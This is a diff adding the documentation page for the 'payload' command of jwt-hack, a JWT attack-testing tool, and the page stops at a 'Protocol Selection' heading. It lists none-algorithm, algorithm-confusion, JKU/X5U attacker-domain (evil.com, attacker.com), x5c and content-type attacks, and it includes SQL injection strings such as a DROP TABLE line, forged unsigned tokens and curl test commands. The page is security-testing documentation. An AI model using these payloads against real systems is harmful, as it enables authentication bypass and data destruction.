@@ -1,0 +1,1222 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="goyo-dark" style="background-color: #000000;">
+
+<head>
+    
+        
+    
+    
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <!-- Resource Hints for better performance -->
+    
+
+    <!-- Initialize theme and brightness before CSS loads to prevent FOUC -->
+    <script>
+        (function() {
+            // Theme mapping - maps user-friendly names to actual DaisyUI theme names
+            // var themeMapping = { "goyo-dark": "night", "goyo-light": "lofi" };
+
+            
+            
+            
+                
+                
+                
+                
+            
+            // Get default values from config
+            var defaultColorset = "dark";
+            var darkBrightness = "darker";
+            var lightBrightness = "normal";
+
+            // Read configured theme names from config.toml (with defaults)
+            var configuredDarkTheme = "goyo-dark";
+            var configuredLightTheme = "goyo-light";
+
+            // Expose to goyo.js
+            window.themeConfig = {
+                darkTheme: configuredDarkTheme,
+                lightTheme: configuredLightTheme
+            };
+
+            // Expose brightness config for global use (e.g., goyo.js)
+            window.darkBrightness = darkBrightness;
+            window.lightBrightness = lightBrightness;
+
+            var fallbackTheme = (defaultColorset === "dark") ? configuredDarkTheme : configuredLightTheme;
+            window.fallbackTheme = fallbackTheme;
+
+            // Get theme from localStorage, but only use it if it matches configured themes
+            var storedTheme = localStorage.getItem('theme');
+            var currentTheme;
+            if (storedTheme === configuredDarkTheme || storedTheme === configuredLightTheme) {
+                currentTheme = storedTheme;
+            } else {
+                currentTheme = fallbackTheme;
+            }
+
+            // Determine brightness based on current theme
+            var currentBrightness = (currentTheme === configuredDarkTheme) ? darkBrightness : lightBrightness;
+
+            // Set theme and brightness attributes immediately
+            document.documentElement.setAttribute("data-theme", currentTheme);
+            document.documentElement.setAttribute("data-brightness", currentBrightness);
+        })();
+    </script>
+
+    <style>
+        
+        
+        
+            
+            
+            
+        
+        
+            
+            @font-face {
+                font-family: "Pretendard-Regular";
+                src: url('https://jwt-hack.hahwul.com/fonts/Pretendard-Regular.woff') format("woff");
+                font-weight: 400;
+                font-style: normal;
+                font-display: swap;
+            }
+            body {
+                font-family: "Pretendard-Regular", sans-serif;
+            }
+        
+    </style>
+
+    
+        
+            <meta name="description" content="A high-performance toolkit for testing, analyzing and attacking JSON Web Tokens" />
+        
+    
+
+    <title>Payload Command | JWT-HACK</title>
+
+    
+    
+
+      <!-- SEO: Open Graph / Twitter Card -->
+      <meta property="og:title" content="Payload Command | JWT-HACK" />
+      <meta property="og:description" content="A high-performance toolkit for testing, analyzing and attacking JSON Web Tokens" />
+      <meta property="og:url" content="https://jwt-hack.hahwul.com" />
+      <meta property="og:type" content="website" />
+      
+      <meta property="og:image" content="https://jwt-hack.hahwul.com/images/preview.jpg" />
+      
+
+      <meta name="twitter:card" content="summary_large_image" />
+      <meta name="twitter:title" content="Payload Command" />
+      <meta name="twitter:description" content="A high-performance toolkit for testing, analyzing and attacking JSON Web Tokens" />
+      
+      
+      
+          
+          
+      
+      
+      <meta name="twitter:site" content="@hahwul" />
+      
+      
+      <meta name="twitter:creator" content="@hahwul" />
+      
+      
+      <meta name="twitter:image" content="https://jwt-hack.hahwul.com/images/preview.jpg" />
+      
+
+      <!-- Browser address bar color -->
+      <meta name="theme-color" content="#000000">
+
+      <!-- Favicon -->
+      
+      
+      
+      
+          
+          
+          
+          
+          
+          
+      
+      <link rel="icon" type="image/png" href="/icons/favicon-96x96.png" sizes="96x96" />
+      <link rel="icon" type="image/svg+xml" href="/icons/favicon.svg" />
+      <link rel="shortcut icon" href="/icons/favicon.ico" />
+      <link rel="apple-touch-icon" sizes="180x180" href="/icons/apple-touch-icon.png" />
+      <link rel="manifest" href="/icons/site.webmanifest" />
+
+      <!-- CSS -->
+    <link rel="stylesheet" href="https://jwt-hack.hahwul.com/css/main.css">
+    <link rel="stylesheet" href="https://jwt-hack.hahwul.com/css/custom-main.css">
+    <link rel="stylesheet" href="https://jwt-hack.hahwul.com/css/font-awesome.min.css">
+
+    <!-- Preload critical fonts -->
+    <link rel="preload" href="https://jwt-hack.hahwul.com/fonts/Pretendard-Regular.woff" as="font" type="font/woff" crossorigin>
+
+    <!-- Defer non-critical scripts -->
+    <script defer src="https://jwt-hack.hahwul.com/js/copy_code.js"></script>
+    <script defer src="https://jwt-hack.hahwul.com/js/copy_heading_link.js"></script>
+
+    <!-- Lazy load Mermaid and KaTeX - only when needed -->
+    <script>
+        // Lazy load KaTeX and Mermaid when needed
+        window.addEventListener('DOMContentLoaded', function() {
+            // Check for both KaTeX inline and block elements in one pass
+            var katexInlineElements = document.querySelectorAll('.katex-inline');
+            var katexBlockElements = document.querySelectorAll('.katex-block');
+            var hasKatex = katexInlineElements.length > 0 || katexBlockElements.length > 0;
+            var hasMermaid = document.querySelector('.mermaid');
+
+            // Load KaTeX if math elements are present
+            if (hasKatex) {
+                // Load KaTeX CSS first
+                var katexCSS = document.createElement('link');
+                katexCSS.rel = 'stylesheet';
+                katexCSS.href = 'https://jwt-hack.hahwul.com/css/katex.min.css';
+                document.head.appendChild(katexCSS);
+
+                // Load KaTeX JS
+                var katexScript = document.createElement('script');
+                katexScript.src = 'https://jwt-hack.hahwul.com/js/katex.min.js';
+                katexScript.onload = function() {
+                    // Render inline elements
+                    katexInlineElements.forEach(function(elem) {
+                        var texContent = elem.textContent || elem.innerText;
+                        try {
+                            katex.render(texContent, elem, {
+                                throwOnError: false,
+                                displayMode: false
+                            });
+                        } catch(e) {
+                            console.error('KaTeX render error:', e);
+                        }
+                    });
+
+                    // Render block elements
+                    katexBlockElements.forEach(function(elem) {
+                        var texContent = elem.textContent || elem.innerText;
+                        try {
+                            katex.render(texContent, elem, {
+                                throwOnError: false,
+                                displayMode: true
+                            });
+                        } catch(e) {
+                            console.error('KaTeX render error:', e);
+                        }
+                    });
+                };
+                document.head.appendChild(katexScript);
+            }
+
+            // Load Mermaid if diagram elements are present
+            if (hasMermaid) {
+                var mermaidScript = document.createElement('script');
+                mermaidScript.src = 'https://jwt-hack.hahwul.com/js/mermaid.min.js';
+                mermaidScript.onload = function() {
+                    // Initialize Mermaid after loading
+                    if (typeof window.initMermaid === 'function') {
+                        window.initMermaid();
+                    }
+                };
+                document.head.appendChild(mermaidScript);
+            }
+        });
+    </script>
+
+    
+    
+</head>
+<body>
+    
+
+<!-- Search Modal -->
+<input type="checkbox" id="search-modal" class="modal-toggle" />
+<div class="modal modal-middle">
+    <div class="modal-box relative max-w-2xl p-0 bg-base-100 shadow-2xl">
+        <label for="search-modal" class="btn btn-sm btn-circle btn-ghost absolute right-4 top-4 z-10">✕</label>
+        <div class="search-container">
+            <!-- Search Input Container -->
+            <div class="search-input-container px-6 pt-6 pb-4 border-b border-base-300/30">
+                <div class="relative">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="search-icon absolute left-4 top-1/2 -translate-y-1/2 h-5 w-5 text-base-content/40" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z" />
+                    </svg>
+                    <input id="search" type="search" placeholder="Search documentation..." class="search-input w-full pl-12 pr-4 py-3 text-base bg-transparent border-0 focus:outline-none focus:ring-0 text-base-content placeholder:text-base-content/40">
+                </div>
+            </div>
+            <!-- Search Results Container -->
+            <div class="search-results-container px-2 py-2 h-96 overflow-y-auto">
+                <div class="search-results__header px-4 py-2 text-xs text-base-content/60"></div>
+                <ul class="search-results__items space-y-1"></ul>
+            </div>
+            <!-- Search Footer -->
+            <div class="search-footer px-6 py-3 border-t border-base-300/30 flex items-center justify-end gap-4 text-xs text-base-content/50">
+                <div class="flex items-center gap-1">
+                    <kbd class="kbd kbd-xs">↑</kbd>
+                    <kbd class="kbd kbd-xs">↓</kbd>
+                    <span>to navigate</span>
+                </div>
+                <div class="flex items-center gap-1">
+                    <kbd class="kbd kbd-xs">↵</kbd>
+                    <span>to select</span>
+                </div>
+                <div class="flex items-center gap-1">
+                    <kbd class="kbd kbd-xs">esc</kbd>
+                    <span>to close</span>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+    <div class="drawer lg:drawer-open">
+        <input id="my-drawer-2" type="checkbox" class="drawer-toggle" />
+        <div class="drawer-content flex flex-col pt-16">
+            
+
+
+
+
+
+    
+    
+    
+    
+    
+
+
+
+
+<div class="navbar opacity-95 fixed top-0 left-0 right-0 z-50 h-16 border-b border-gray-500/15 backdrop-blur-3xl">
+    <!-- Mobile hamburger -->
+    <div class="flex-none lg:hidden">
+        <label for="my-drawer-2" class="btn btn-square btn-ghost">
+            <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" class="inline-block w-5 h-5 stroke-current"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 6h16M4 12h16M4 18h16"></path></svg>
+        </label>
+    </div>
+    <!-- Logo -->
+    <div class="flex-1">
+        <a href="/" class="btn btn-ghost hover:animate-pulse hover:bg-transparent hover:border-transparent normal-case text-xl" style="background: linear-gradient(135deg, #9ca3af, #6b7280); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text; font-weight: bold; font-size: 1.5rem;">
+            
+                
+                
+                
+                
+                
+                
+                
+                <img 
+                    src="https://jwt-hack.hahwul.com/images/jwt-hack-dark.png" 
+                    alt="JWT-HACK" 
+                    class="h-18 w-auto logo-dark"
+                    data-logo-type="dark"
+                    style="padding: 10px;"
+                />
+                
+                <img 
+                    src="https://jwt-hack.hahwul.com/images/jwt-hack-light.png" 
+                    alt="JWT-HACK" 
+                    class="h-18 w-auto logo-light hidden"
+                    data-logo-type="light"
+                    style="padding: 10px;"
+                />
+            
+        </a>
+    </div>
+    <!-- Desktop Menu -->
+    <div class="flex-none hidden lg:flex">
+        
+<ul class="menu w-full justify-end lg:menu-horizontal px-1">
+    
+    
+    
+    
+    
+    <li>
+        <a class="btn btn-ghost hover:no-underline justify-end w-full" href="/get_started/installation">
+            <i class="fa-solid fa-book"></i>
+            Documents
+        </a>
+    </li>
+    
+    
+    
+    <li>
+        <a class="btn btn-ghost hover:no-underline justify-end w-full" href="https://github.com/hahwul/jwt-hack">
+            <i class="fa-brands fa-github"></i>
+            GitHub
+        </a>
+    </li>
+    
+    
+    
+    <li class="dropdown dropdown-end">
+        <div tabindex="0" role="button" class="btn btn-ghost justify-end w-full">
+            <i class="fa-solid fa-link"></i>
+            Links
+            <svg class="inline w-4 h-4 ml-1" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"></path></svg>
+        </div>
+        <ul tabindex="0" class="dropdown-content menu bg-base-100 border border-gray-500/15 rounded-box z-1 p-2 shadow-sm">
+            
+            <li>
+                <a class="btn btn-ghost hover:no-underline" href="https://crates.io/crates/jwt-hack">
+                    <i class="fa-solid fa-box"></i>
+                    Crates
+                </a>
+            </li>
+            
+            <li>
+                <a class="btn btn-ghost hover:no-underline" href="https://www.hahwul.com">
+                    <i class="fa-solid fa-fire-flame-curved"></i>
+                    Creator Blog
+                </a>
+            </li>
+            
+        </ul>
+    </li>
+    
+    
+    
+    
+
+    
+    
+    
+    
+    
+    
+    <li>
+        <label class="swap swap-rotate btn btn-ghost justify-end w-full">
+            <input type="checkbox" class="theme-controller" value="goyo-dark" aria-labelledby="swap color"/>
+            <svg class="swap-off h-5 w-5 fill-current" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M5.64,17l-.71.71a1,1,0,0,0,0,1.41,1,1,0,0,0,1.41,0l.71-.71A1,1,0,0,0,5.64,17ZM5,12a1,1,0,0,0-1-1H3a1,1,0,0,0,0,2H4A1,1,0,0,0,5,12Zm7-7a1,1,0,0,0,1-1V3a1,1,0,0,0-2,0V4A1,1,0,0,0,12,5ZM5.64,7.05a1,1,0,0,0,.7.29,1,1,0,0,0,.71-.29,1,1,0,0,0,0-1.41l-.71-.71A1,1,0,0,0,4.93,6.34Zm12,.29a1,1,0,0,0,.7-.29l.71-.71a1,1,0,1,0-1.41-1.41L17,5.64a1,1,0,0,0,0,1.41A1,1,0,0,0,17.66,7.34ZM21,11H20a1,1,0,0,0,0,2h1a1,1,0,0,0,0-2Zm-9,8a1,1,0,0,0-1,1v1a1,1,0,0,0,2,0V20A1,1,0,0,0,12,19ZM18.36,17A1,1,0,0,0,17,18.36l.71.71a1,1,0,0,0,1.41,0,1,1,0,0,0,0-1.41ZM12,6.5A5.5,5.5,0,1,0,17.5,12,5.51,5.51,0,0,0,12,6.5Zm0,9A3.5,3.5,0,1,1,15.5,12,3.5,3.5,0,0,1,12,15.5Z" /></svg>
+            <svg class="swap-on h-5 w-5 fill-current" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21.64,13a1,1,0,0,0-1.05-.14,8.05,8.05,0,0,1-3.37.73A8.15,8.15,0,0,1,9.08,5.49a8.59,8.59,0,0,1,.25-2A1,1,0,0,0,8,2.36,10.14,10.14,0,1,0,22,14.05,1,1,0,0,0,21.64,13Zm-9.5,6.69A8.14,8.14,0,0,1,7.08,5.22v.27A10.15,10.15,0,0,0,17.22,15.63a9.79,9.79,0,0,0,2.1-.22A8.11,8.11,0,0,1,12.14,19.73Z" /></svg>
+        </label>
+    </li>
+    
+
+</ul>
+
+    </div>
+</div>
+
+
+            
+            
+            
+            
+                
+            
+            
+            <div class="p-8 w-full flex justify-center">
+                <div class="w-full max-w-7xl lg:grid lg:grid-cols-[1fr_250px] lg:gap-8">
+                    <main class="prose w-full">
+                        
+    <div class="mb-12 pb-4 border-b border-gray-500/15">
+        <h1 class="flex items-center gap-3">
+            Payload Command
+            
+        </h1>
+        <p class="text-gray-500"></p>
+    </div>
+    <p>The <code>payload</code> command generates various JWT attack payloads for security testing and vulnerability assessment.</p>
+<h2 id="basic-usage">Basic Usage</h2>
+<pre class="giallo" style="color: #E1E4E8; background-color: #24292E;"><code data-lang="shellscript"><span class="giallo-l"><span style="color: #B392F0;">jwt-hack</span><span style="color: #9ECBFF;"> payload</span><span style="color: #F97583;"> &lt;</span><span style="color: #9ECBFF;">TOKE</span><span>N</span><span style="color: #F97583;">&gt;</span><span> [OPTIONS]</span></span></code></pre><h2 id="attack-payload-types">Attack Payload Types</h2>
+<h3 id="none-algorithm-attack">None Algorithm Attack</h3>
+<p>Remove signature verification requirement:</p>
+<pre class="giallo" style="color: #E1E4E8; background-color: #24292E;"><code data-lang="shellscript"><span class="giallo-l"><span style="color: #B392F0;">jwt-hack</span><span style="color: #9ECBFF;"> payload</span><span style="color: #F97583;"> &lt;</span><span style="color: #9ECBFF;">TOKE</span><span>N</span><span style="color: #F97583;">&gt;</span><span style="color: #79B8FF;"> --target=none</span></span></code></pre>
+<p>Generates payloads with:</p>
+<ul>
+<li><code>alg: "none"</code> (lowercase)</li>
+<li><code>alg: "None"</code> (capitalized)</li>
+<li><code>alg: "NONE"</code> (uppercase)</li>
+<li>Various case combinations</li>
+</ul>
+<h3 id="algorithm-confusion-attack">Algorithm Confusion Attack</h3>
+<p>Convert RSA tokens to HMAC using public key as secret:</p>
+<pre class="giallo" style="color: #E1E4E8; background-color: #24292E;"><code data-lang="shellscript"><span class="giallo-l"><span style="color: #B392F0;">jwt-hack</span><span style="color: #9ECBFF;"> payload</span><span style="color: #F97583;"> &lt;</span><span style="color: #9ECBFF;">RSA_TOKE</span><span>N</span><span style="color: #F97583;">&gt;</span><span style="color: #79B8FF;"> --target=alg_confusion</span></span></code></pre>
+<p>Creates payloads that:</p>
+<ul>
+<li>Change algorithm from RS256 to HS256</li>
+<li>Use public key content as HMAC secret</li>
+<li>Test algorithm substitution vulnerabilities</li>
+</ul>
+<h3 id="jku-x5u-url-attacks">JKU/X5U URL Attacks</h3>
+<p>Manipulate JSON Web Key URLs:</p>
+<pre class="giallo" style="color: #E1E4E8; background-color: #24292E;"><code data-lang="shellscript"><span class="giallo-l"><span style="color: #6A737D;"># Basic JKU/X5U attack</span></span>
+<span class="giallo-l"><span style="color: #B392F0;">jwt-hack</span><span style="color: #9ECBFF;"> payload</span><span style="color: #F97583;"> &lt;</span><span style="color: #9ECBFF;">TOKE</span><span>N</span><span style="color: #F97583;">&gt;</span><span style="color: #79B8FF;"> --target=jku</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #6A737D;"># With trusted domain bypass</span></span>
+<span class="giallo-l"><span style="color: #B392F0;">jwt-hack</span><span style="color: #9ECBFF;"> payload</span><span style="color: #F97583;"> &lt;</span><span style="color: #9ECBFF;">TOKE</span><span>N</span><span style="color: #F97583;">&gt;</span><span style="color: #79B8FF;"> --jwk-trust=trusted.com --jwk-attack=evil.com</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #6A737D;"># Custom protocol and attack domain  </span></span>
+<span class="giallo-l"><span style="color: #B392F0;">jwt-hack</span><span style="color: #9ECBFF;"> payload</span><span style="color: #F97583;"> &lt;</span><span style="color: #9ECBFF;">TOKE</span><span>N</span><span style="color: #F97583;">&gt;</span><span style="color: #79B8FF;"> --jwk-attack=attacker.com --jwk-protocol=http</span></span></code></pre>
+<p>Generates payloads with:</p>
+<ul>
+<li>Malicious JKU URLs pointing to attacker-controlled keys</li>
+<li>X5U URLs for certificate chain manipulation</li>
+<li>Domain bypass techniques</li>
+<li>Protocol downgrade attacks</li>
+</ul>
+<h3 id="kid-sql-injection">KID SQL Injection</h3>
+<p>Inject SQL payloads in Key ID field:</p>
+<pre class="giallo" style="color: #E1E4E8; background-color: #24292E;"><code data-lang="shellscript"><span class="giallo-l"><span style="color: #B392F0;">jwt-hack</span><span style="color: #9ECBFF;"> payload</span><span style="color: #F97583;"> &lt;</span><span style="color: #9ECBFF;">TOKE</span><span>N</span><span style="color: #F97583;">&gt;</span><span style="color: #79B8FF;"> --target=kid_sql</span></span></code></pre>
+<p>Generates payloads with SQL injection vectors:</p>
+<ul>
+<li><code>' OR 1=1--</code></li>
+<li><code>'; DROP TABLE users;--</code></li>
+<li><code>' UNION SELECT null--</code></li>
+<li>Time-based blind SQL injection payloads</li>
+</ul>
+<h3 id="x5c-certificate-injection">X5C Certificate Injection</h3>
+<p>Inject malicious certificate chains:</p>
+<pre class="giallo" style="color: #E1E4E8; background-color: #24292E;"><code data-lang="shellscript"><span class="giallo-l"><span style="color: #B392F0;">jwt-hack</span><span style="color: #9ECBFF;"> payload</span><span style="color: #F97583;"> &lt;</span><span style="color: #9ECBFF;">TOKE</span><span>N</span><span style="color: #F97583;">&gt;</span><span style="color: #79B8FF;"> --target=x5c</span></span></code></pre>
+<p>Creates payloads with:</p>
+<ul>
+<li>Malicious certificate chains</li>
+<li>Self-signed certificates</li>
+<li>Certificate with custom extensions</li>
+<li>Chain validation bypass attempts</li>
+</ul>
+<h3 id="cty-content-type-attacks">CTY Content Type Attacks</h3>
+<p>Manipulate content type headers for XXE and deserialization:</p>
+<pre class="giallo" style="color: #E1E4E8; background-color: #24292E;"><code data-lang="shellscript"><span class="giallo-l"><span style="color: #B392F0;">jwt-hack</span><span style="color: #9ECBFF;"> payload</span><span style="color: #F97583;"> &lt;</span><span style="color: #9ECBFF;">TOKE</span><span>N</span><span style="color: #F97583;">&gt;</span><span style="color: #79B8FF;"> --target=cty</span></span></code></pre>
+<p>Generates payloads with content types for:</p>
+<ul>
+<li><code>text/xml</code> - XML External Entity (XXE) attacks</li>
+<li><code>application/xml</code> - XML processing vulnerabilities</li>
+<li><code>application/x-java-serialized-object</code> - Java deserialization</li>
+<li><code>application/json+x-jackson-smile</code> - Jackson deserialization</li>
+</ul>
+<h2 id="generate-all-payload-types">Generate All Payload Types</h2>
+<p>Create comprehensive attack payload set:</p>
+<pre class="giallo" style="color: #E1E4E8; background-color: #24292E;"><code data-lang="shellscript"><span class="giallo-l"><span style="color: #6A737D;"># Generate all attack types</span></span>
+<span class="giallo-l"><span style="color: #B392F0;">jwt-hack</span><span style="color: #9ECBFF;"> payload</span><span style="color: #F97583;"> &lt;</span><span style="color: #9ECBFF;">TOKE</span><span>N</span><span style="color: #F97583;">&gt;</span><span style="color: #79B8FF;"> --target=all</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #6A737D;"># All attacks with custom domains</span></span>
+<span class="giallo-l"><span style="color: #B392F0;">jwt-hack</span><span style="color: #9ECBFF;"> payload</span><span style="color: #F97583;"> &lt;</span><span style="color: #9ECBFF;">TOKE</span><span>N</span><span style="color: #F97583;">&gt;</span><span style="color: #79B8FF;"> --target=all --jwk-attack=evil.com --jwk-trust=trusted.com</span></span></code></pre><h2 id="command-options">Command Options</h2>
+<h3 id="required">Required</h3>
+<ul>
+<li><code>&lt;TOKEN&gt;</code> - Base JWT token for payload generation</li>
+</ul>
+<h3 id="target-selection">Target Selection</h3>
+<ul>
+<li><code>--target &lt;TYPE&gt;</code> - Payload types: <code>all</code>, <code>none</code>, <code>jku</code>, <code>x5u</code>, <code>alg_confusion</code>, <code>kid_sql</code>, <code>x5c</code>, <code>cty</code></li>
+</ul>
+<h3 id="jku-x5u-attack-options">JKU/X5U Attack Options</h3>
+<ul>
+<li><code>--jwk-trust &lt;DOMAIN&gt;</code> - Trusted domain for bypass techniques</li>
+<li><code>--jwk-attack &lt;DOMAIN&gt;</code> - Attacker-controlled domain</li>
+<li><code>--jwk-protocol &lt;PROTOCOL&gt;</code> - Protocol to use (http/https, default: https)</li>
+</ul>
+<h2 id="output-format">Output Format</h2>
+<p>Payloads are displayed with:</p>
+<ul>
+<li>Attack type identifier</li>
+<li>Modified JWT token</li>
+<li>Description of the attack vector</li>
+<li>Usage recommendations</li>
+</ul>
+<p>Example output:</p>
+<pre class="giallo" style="color: #E1E4E8; background-color: #24292E;"><code data-lang="plain"><span class="giallo-l"><span>🎯 None Algorithm Attack Payloads:</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span>[1] None Algorithm (lowercase)</span></span>
+<span class="giallo-l"><span>eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0In0.</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span>[2] None Algorithm (capitalized)  </span></span>
+<span class="giallo-l"><span>eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0In0.</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span>[3] None Algorithm (uppercase)</span></span>
+<span class="giallo-l"><span>eyJhbGciOiJOT05FIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0In0.</span></span></code></pre><h2 id="attack-scenarios">Attack Scenarios</h2>
+<h3 id="testing-authentication-bypass">Testing Authentication Bypass</h3>
+<pre class="giallo" style="color: #E1E4E8; background-color: #24292E;"><code data-lang="shellscript"><span class="giallo-l"><span style="color: #6A737D;"># Test if application accepts unsigned tokens</span></span>
+<span class="giallo-l"><span style="color: #B392F0;">jwt-hack</span><span style="color: #9ECBFF;"> payload</span><span style="color: #F97583;"> &lt;</span><span style="color: #9ECBFF;">TOKE</span><span>N</span><span style="color: #F97583;">&gt;</span><span style="color: #79B8FF;"> --target=none</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #6A737D;"># Test each generated payload:</span></span>
+<span class="giallo-l"><span style="color: #B392F0;">curl</span><span style="color: #79B8FF;"> -H</span><span style="color: #9ECBFF;"> &quot;Authorization: Bearer &lt;NONE_PAYLOAD&gt;&quot; https://api.example.com/user</span></span></code></pre><h3 id="algorithm-confusion-testing">Algorithm Confusion Testing</h3>
+<pre class="giallo" style="color: #E1E4E8; background-color: #24292E;"><code data-lang="shellscript"><span class="giallo-l"><span style="color: #6A737D;"># Generate algorithm confusion payloads</span></span>
+<span class="giallo-l"><span style="color: #B392F0;">jwt-hack</span><span style="color: #9ECBFF;"> payload</span><span style="color: #F97583;"> &lt;</span><span style="color: #9ECBFF;">RSA_TOKE</span><span>N</span><span style="color: #F97583;">&gt;</span><span style="color: #79B8FF;"> --target=alg_confusion</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #6A737D;"># Test with public key content as HMAC secret</span></span>
+<span class="giallo-l"><span style="color: #B392F0;">curl</span><span style="color: #79B8FF;"> -H</span><span style="color: #9ECBFF;"> &quot;Authorization: Bearer &lt;CONFUSED_PAYLOAD&gt;&quot; https://api.example.com/admin</span></span></code></pre><h3 id="key-url-manipulation">Key URL Manipulation</h3>
+<pre class="giallo" style="color: #E1E4E8; background-color: #24292E;"><code data-lang="shellscript"><span class="giallo-l"><span style="color: #6A737D;"># Test JKU/X5U URL attacks</span></span>
+<span class="giallo-l"><span style="color: #B392F0;">jwt-hack</span><span style="color: #9ECBFF;"> payload</span><span style="color: #F97583;"> &lt;</span><span style="color: #9ECBFF;">TOKE</span><span>N</span><span style="color: #F97583;">&gt;</span><span style="color: #79B8FF;"> --target=jku --jwk-attack=attacker.com</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #6A737D;"># Host malicious JWK at attacker.com/keys.json</span></span>
+<span class="giallo-l"><span style="color: #6A737D;"># Test if application fetches keys from attacker URL</span></span></code></pre><h3 id="sql-injection-in-kid">SQL Injection in KID</h3>
+<pre class="giallo" style="color: #E1E4E8; background-color: #24292E;"><code data-lang="shellscript"><span class="giallo-l"><span style="color: #6A737D;"># Generate KID SQL injection payloads  </span></span>
+<span class="giallo-l"><span style="color: #B392F0;">jwt-hack</span><span style="color: #9ECBFF;"> payload</span><span style="color: #F97583;"> &lt;</span><span style="color: #9ECBFF;">TOKE</span><span>N</span><span style="color: #F97583;">&gt;</span><span style="color: #79B8FF;"> --target=kid_sql</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #6A737D;"># Test each payload for SQL injection responses</span></span>
+<span class="giallo-l"><span style="color: #6A737D;"># Monitor application logs for SQL errors</span></span></code></pre><h2 id="security-testing-workflow">Security Testing Workflow</h2>
+<h3 id="1-reconnaissance">1. Reconnaissance</h3>
+<pre class="giallo" style="color: #E1E4E8; background-color: #24292E;"><code data-lang="shellscript"><span class="giallo-l"><span style="color: #6A737D;"># Decode token to understand structure</span></span>
+<span class="giallo-l"><span style="color: #B392F0;">jwt-hack</span><span style="color: #9ECBFF;"> decode</span><span style="color: #F97583;"> &lt;</span><span style="color: #9ECBFF;">TOKE</span><span>N</span><span style="color: #F97583;">&gt;</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #6A737D;"># Generate comprehensive payload set</span></span>
+<span class="giallo-l"><span style="color: #B392F0;">jwt-hack</span><span style="color: #9ECBFF;"> payload</span><span style="color: #F97583;"> &lt;</span><span style="color: #9ECBFF;">TOKE</span><span>N</span><span style="color: #F97583;">&gt;</span><span style="color: #79B8FF;"> --target=all</span></span></code></pre><h3 id="2-systematic-testing">2. Systematic Testing</h3>
+<pre class="giallo" style="color: #E1E4E8; background-color: #24292E;"><code data-lang="shellscript"><span class="giallo-l"><span style="color: #6A737D;"># Test none algorithm bypasses</span></span>
+<span class="giallo-l"><span style="color: #B392F0;">jwt-hack</span><span style="color: #9ECBFF;"> payload</span><span style="color: #F97583;"> &lt;</span><span style="color: #9ECBFF;">TOKE</span><span>N</span><span style="color: #F97583;">&gt;</span><span style="color: #79B8FF;"> --target=none</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #6A737D;"># Test each payload systematically</span></span>
+<span class="giallo-l"><span style="color: #6A737D;"># Document responses and behaviors</span></span></code></pre><h3 id="3-advanced-attacks">3. Advanced Attacks</h3>
+<pre class="giallo" style="color: #E1E4E8; background-color: #24292E;"><code data-lang="shellscript"><span class="giallo-l"><span style="color: #6A737D;"># Algorithm confusion (if RSA token)</span></span>
+<span class="giallo-l"><span style="color: #B392F0;">jwt-hack</span><span style="color: #9ECBFF;"> payload</span><span style="color: #F97583;"> &lt;</span><span style="color: #9ECBFF;">RSA_TOKE</span><span>N</span><span style="color: #F97583;">&gt;</span><span style="color: #79B8FF;"> --target=alg_confusion</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #6A737D;"># URL manipulation attacks</span></span>
+<span class="giallo-l"><span style="color: #B392F0;">jwt-hack</span><span style="color: #9ECBFF;"> payload</span><span style="color: #F97583;"> &lt;</span><span style="color: #9ECBFF;">TOKE</span><span>N</span><span style="color: #F97583;">&gt;</span><span style="color: #79B8FF;"> --target=jku --jwk-attack=controlled-domain.com</span></span></code></pre><h2 id="payload-customization">Payload Customization</h2>
+<h3 id="custom-domains">Custom Domains</h3>
+<pre class="giallo" style="color: #E1E4E8; background-color: #24292E;"><code data-lang="shellscript"><span class="giallo-l"><span style="color: #6A737D;"># Use specific attack domains</span></span>
+<span class="giallo-l"><span style="color: #B392F0;">jwt-hack</span><span style="color: #9ECBFF;"> payload</span><span style="color: #F97583;"> &lt;</span><span style="color: #9ECBFF;">TOKE</span><span>N</span><span style="color: #F97583;">&gt;</span><span style="color: #79B8FF;"> --target=jku --jwk-attack=evil.hacker.com</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #6A737D;"># Bypass domain restrictions</span></span>
+<span class="giallo-l"><span style="color: #B392F0;">jwt-hack</span><span style="color: #9ECBFF;"> payload</span><span style="color: #F97583;"> &lt;</span><span style="color: #9ECBFF;">TOKE</span><span>N</span><span style="color: #F97583;">&gt;</span><span style="color: #79B8FF;"> --target=x5u --jwk-trust=trusted.com --jwk-attack=evil.com</span></span></code></pre><h3 id="protocol-selection">Protocol Selection</h3>
